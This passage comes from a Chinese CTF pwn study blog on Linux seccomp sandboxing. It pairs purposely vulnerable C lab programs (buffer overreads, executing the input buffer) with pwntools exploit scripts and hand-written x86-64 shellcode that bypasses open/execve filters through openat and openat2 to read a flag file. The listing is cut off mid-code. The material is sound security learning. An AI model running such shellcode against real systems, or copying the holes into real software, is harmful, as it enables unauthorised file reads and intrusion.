class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">    ((<span class="type">void</span> (*)())buf)();  <span class="comment">// 直接调用buf作为函数指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>checksec发现<code>关闭了open</code></li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwn@ctfpwn:~/learn/Seccomp/test/3种open$ seccomp-tools dump ./openat1</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure></div><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./openat1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./openat1&quot;</span>)</span><br><span class="line"><span class="comment">#*************************  绝对路径 ******************************************</span></span><br><span class="line"><span class="comment">#shellcode = shellcraft.openat(0,&#x27;/home/pwn/learn/Seccomp/test/3种open/flag&#x27;,0,0) </span></span><br><span class="line"><span class="comment"># *****************************************************************************</span></span><br><span class="line">shellcode = shellcraft.openat(-<span class="number">100</span>,<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment"># 相对路径</span></span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)   </span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure></div><p>效果：</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241115140648568.bmp"></p><h3 id="手写："><a href="#手写：" class="headerlink" title="手写："></a>手写：</h3><ul><li>采用的是相对路径</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">/*openat(0,&#x27;./flag&#x27;,0,0) */</span><br><span class="line">    mov rax, 0x67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor rax, rax</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    sub rdi, 100</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov r10, 7</span><br><span class="line">    xor r8, r8</span><br><span class="line">    mov rax, 0x101</span><br><span class="line">    syscall;</span><br><span class="line"></span><br><span class="line">/* read(3,&#x27;rsp&#x27;,0x30) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 0x30</span><br><span class="line">    syscall;</span><br><span class="line"></span><br><span class="line">/* write(1,&#x27;rsp&#x27;, 0x30) */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    push 1; pop rdi</span><br><span class="line">    push 0x30; pop rdx</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall; </span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div><h2 id="openat2"><a href="#openat2" class="headerlink" title="openat2"></a>openat2</h2><ul><li><code>openat2</code> 是 <code>openat</code> 的进一步扩展，主要出现在 <code>Linux 5.6 及以上版本中</code>。<code>openat2</code> 提供了比 <code>openat</code> 更强大的文件打开控制功能，允许用户在文件打开时传递更多的选项和控制标志，尤其是与路径解析和文件权限相关的功能。</li><li>函数原型：</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat2</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="keyword">struct</span> open_how *how)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">openat2</span><span class="params">(<span class="type">int</span> dirfd, <span class="type">const</span> <span class="type">char</span> *pathname, <span class="keyword">struct</span> open_how *how, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div><p>可以发现多了<code>open_how</code>这样的结构体，这个结构体使得openat2更加灵活和方便的打开文件</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_how</span> &#123;</span></span><br><span class="line">    __aligned_u64 flags;         <span class="comment">// 文件标志，类似于 O_RDONLY 等</span></span><br><span class="line">    __aligned_u64 mode;          <span class="comment">// 创建文件时的权限</span></span><br><span class="line">    __aligned_u64 resolve;       <span class="comment">// 路径解析策略（例如 O_PATH 等）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><h3 id="openat2-系统调用"><a href="#openat2-系统调用" class="headerlink" title="openat2 系统调用"></a><strong><code>openat2</code> 系统调用</strong></h3><p><code>openat2</code> 系统调用在 Linux 5.6 中引入，系统调用号是 <code>437</code>，允许更灵活地传递打开文件的选项。它的参数通过 <code>struct open_how</code> 结构体传递。</p><blockquote><h4 id="系统调用参数：-2"><a href="#系统调用参数：-2" class="headerlink" title="系统调用参数："></a>系统调用参数：</h4><ul><li><code>rax</code>：系统调用号（对于 <code>openat2</code>，值为 <code>437</code>）。</li><li><code>rdi</code>：目录文件描述符 <code>dirfd</code>（例如 <code>AT_FDCWD</code>）。</li><li><code>rsi</code>：文件路径 <code>pathname</code>（指向字符串的指针）。</li><li><code>rdx</code>：指向 <code>struct open_how</code> 结构体的指针。</li></ul></blockquote><h3 id="通常用法-4"><a href="#通常用法-4" class="headerlink" title="通常用法"></a>通常用法</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openat2(<span class="number">-100</span>,flag_addr,flag_addr+<span class="number">0x8</span>,<span class="number">0x18</span>) <span class="comment">//注意参数指向的是flag的地址</span></span><br><span class="line"><span class="comment">// 0x18指的是结构体，3个8字节</span></span><br></pre></td></tr></table></figure></div><h3 id="手写-1"><a href="#手写-1" class="headerlink" title="手写"></a>手写</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">shellcode=&#x27;&#x27;&#x27;</span><br><span class="line">/* openat2(-100,flag_addr,flag_addr+0x20,0x18) */</span><br><span class="line">    mov rdi, -100</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    push rdx</span><br><span class="line">    push rdx</span><br><span class="line">    push rdx</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    mov rsi, 0x67616c662f</span><br><span class="line">    push rsi</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    add rdx, 0x100</span><br><span class="line">    mov r10, 0x18</span><br><span class="line">    mov rax, 437</span><br><span class="line">    syscall;</span><br><span class="line"></span><br><span class="line">/* read(3,&#x27;rsp&#x27;,0x30) */</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 0x30</span><br><span class="line">    syscall;</span><br><span class="line"></span><br><span class="line">/* write(1,&#x27;rsp&#x27;, 0x30) */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    push 1; pop rdi</span><br><span class="line">    push 0x30; pop rdx</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall; </span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div><ul><li>看一下栈结构：</li></ul><p>![](..&#x2F;屏幕截图 2024-11-15 203709.png)</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> seccomp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seccomp学习(1)</title>
      <link href="/2024/11/13/Seccomp%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2024/11/13/Seccomp%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>也算打了蛮多比赛，每次比赛都会有沙箱<code>Sandbox</code>，每次都去上网查资料，这次整理一下各种资料，尽量完善一下关于这方面的知识点。</li><li>这里只介绍linux中的<code>Seccomp</code></li><li>本部分只是基础介绍一下什么是<code>Seccomp</code>以及相关的指令</li></ul><p>参考文章：<a class="link" href="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul><li>先来了解一下什么是沙箱保护</li></ul><blockquote><p><strong>Seccomp（Secure Computing Mode） 是 Linux 内核提供的一种安全机制，允许进程在运行时限制自己能够调用的系统调用。通过这种机制，Seccomp 可以显著降低攻击面，防止恶意进程执行危险的系统调用或造成资源泄露。</strong></p></blockquote><ul><li>也就是说<code>Seccomp</code>会过滤掉它所规定的指令，当用户执行这些指令的时候会被限制，不允许执行，下面让我们简单写一段代码看看</li></ul><p><mark>注意：为了使用seccomp头文件要安装下面所需：<mark></mark></mark></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></table></figure></div><h2 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h2><h3 id="未开启沙箱"><a href="#未开启沙箱" class="headerlink" title="未开启沙箱"></a>未开启沙箱</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gcc -g no_seccomp_execve.c -o no_seccomp_execve -lseccomp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> * argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;i will give you a shell\n&quot;</span>,<span class="number">24</span>);</span><br><span class="line">syscall(<span class="number">59</span>,filename,argv,envp);<span class="comment">//execve</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>执行效果：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113205200278.bmp"></p><h3 id="开启沙箱"><a href="#开启沙箱" class="headerlink" title="开启沙箱"></a>开启沙箱</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g seccomp_execve.c -o seccomp_execve -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>); <span class="comment">// 这里便是关键</span></span><br><span class="line">seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * filename = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> * argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;i will give you a shell\n&quot;</span>,<span class="number">24</span>);</span><br><span class="line">syscall(<span class="number">59</span>,filename,argv,envp);<span class="comment">//execve</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>执行效果：直接报错</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113205326221.bmp"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>对比两段代码，第一个是没有开启沙箱禁用<code>execve</code>，此时随便执行什么都可以。</li></ul><blockquote><h5 id="补充知识："><a href="#补充知识：" class="headerlink" title="补充知识："></a>补充知识：</h5><p><code>ctx</code>:是一个指向 <strong>Seccomp 过滤器上下文</strong> 的指针，它是 <code>seccomp_init</code> 函数返回的一个结构体</p><p><code>ctx = seccomp_init(SCMP_ACT_ALLOW)</code>其中的<code>SCMP_ACT_ALLOW</code> 表示初始化时默认允许所有的系统调用</p></blockquote><ul><li>第二个开启了沙箱，禁用了<code>execve</code>，所以当我们试图去调用<code>execve</code>的时候会报错</li></ul><p>详细解释一下<code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0)</code></p><blockquote><p>使用 <code>seccomp_rule_add()</code> 来向过滤器上下文中添加规则，规定特定的系统调用行为</p></blockquote><blockquote><p> 通过 <code>seccomp_load()</code> 将已配置好的过滤器上下文加载到进程中，开始生效。</p></blockquote><blockquote><p>后面的0表示<code>execve</code>的参数，也就是说无论execve的参数是什么都禁用</p><ul><li>举个例子</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write),<span class="number">1</span>,SCMP_A2(SCMP_CMP_GT,<span class="number">0x10</span>));<span class="comment">//第2(从0)个参数大于0x10</span></span><br><span class="line">seccomp_load(ctx);</span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;i will give you a shell\n&quot;</span>,<span class="number">24</span>);<span class="comment">//会拦截</span></span><br><span class="line">write(<span class="number">1</span>,<span class="string">&quot;1234567812345678&quot;</span>,<span class="number">0x10</span>);<span class="comment">//不被拦截</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>执行效果：</li></ul><p>第一部分为注释掉第一条write,第二部分未注释</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113211240091.bmp"></p></blockquote><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><code>seccomp-tools</code>：下载地址：<a class="link" href="https://blog.csdn.net/2302_79933763/article/details/136888847">this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li><strong>效果</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241113211535561.bmp"></p><h2 id="Prtctl简介"><a href="#Prtctl简介" class="headerlink" title="Prtctl简介"></a>Prtctl简介</h2><p>关于这部分感兴趣的直接看开头的参考文章即可，这里只讲Seccomp</p><h1 id="简单例题-orw"><a href="#简单例题-orw" class="headerlink" title="简单例题(orw)"></a>简单例题(orw)</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g orw.c -o orw -lseccomp -fno-stack-protector -no-pie -z execstack </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;jmp *%rsp;&quot;</span>  <span class="comment">// 跳转到 rsp 寄存器指向的地址</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret;&quot;</span>         <span class="comment">// 返回</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwn@ctfpwn:~/learn/Seccomp/test$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure></div><ul><li>禁用了<code>execve</code>，我们无法直接写execve的shellcode去get shell，但难道没有其他方法了吗？</li><li>这道题目就是经典的<code>orw</code>，<code>open</code>读flag,<code>read</code>将其储存到buf，最后<code>write</code>输出出来，这道题目就可以直接打<code>orw</code>，先布置好<code>shellcode</code>然后jmp到rsp再执行shellcode</li><li>方法参考：<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/139296136">这篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 